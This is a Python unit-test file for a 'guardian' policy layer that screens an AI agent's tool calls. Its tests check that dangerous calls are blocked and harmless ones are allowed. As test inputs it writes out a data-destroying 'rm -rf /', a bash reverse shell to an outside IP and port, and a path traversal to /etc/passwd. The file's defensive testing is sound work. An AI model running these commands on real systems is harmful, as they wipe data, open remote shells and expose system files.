"""第 1 层策略的单元测试（不需要 API Key，可离线跑）。"""

from src.guardian import Action, Context, ToolCall, build_default_guardian
from src.guardian.policy import PolicyLayer

ctx = Context(user_request="测试")


def test_blocks_rm_rf():
    v = PolicyLayer().check(ToolCall("run_shell", {"command": "rm -rf /"}), ctx)
    assert v.action == Action.BLOCK


def test_blocks_reverse_shell():
    v = PolicyLayer().check(ToolCall("run_shell", {"command": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"}), ctx)
    assert v.action == Action.BLOCK


def test_blocks_unknown_tool():
    v = PolicyLayer().check(ToolCall("delete_database", {}), ctx)
    assert v.action == Action.BLOCK


def test_blocks_path_traversal():
    v = PolicyLayer().check(ToolCall("read_file", {"path": "../../etc/passwd"}), ctx)
    assert v.action == Action.BLOCK


def test_allows_benign_shell():
    v = PolicyLayer().check(ToolCall("run_shell", {"command": "echo hello"}), ctx)
    assert v.action == Action.ALLOW


def test_guardian_blocks_dangerous_call():
    guardian = build_default_guardian()
    decision = guardian.evaluate(ToolCall("run_shell", {"command": "rm -rf /"}), ctx)
    assert decision.blocked
